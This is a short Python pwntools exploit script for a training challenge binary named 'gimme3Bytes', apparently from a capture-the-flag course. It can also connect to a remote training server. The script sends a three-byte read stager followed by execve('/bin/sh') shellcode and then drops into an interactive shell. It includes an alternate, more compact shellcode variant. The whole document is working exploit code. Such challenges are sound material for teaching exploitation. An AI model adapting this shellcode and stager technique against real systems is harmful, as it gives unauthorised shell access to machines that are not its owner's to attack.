from pwn import *

context.arch = 'amd64'

if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./gimme3Bytes")
        gdb.attach(c, """
        b *0x00000000004011f1
        c
        """)
        input("Wait")
    elif(sys.argv[1] == '-r'):
        c = remote("gimmie3bytes.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./gimme3Bytes")


shellcode = """
    pop rdx
    syscall
"""

shellcode2 = """
    xor rax, rax
    mov rax, 0x3b
    xor rdx, rdx
    xor rsi, rsi
    mov rdi, 0x0068732f6e69622f
    push rdi
    mov rdi, rsp
    syscall
"""

shellcode2_alt = """
    xor rsi, rsi
    push rsi
    mov rdi, 0x0068732f6e69622f
    push rdi
    push rsp
    pop rdi
    push 59
    pop rax
    cdq
    syscall
"""

c.send(asm(shellcode) + 5*b"\x90" + asm(shellcode2))
c.interactive()
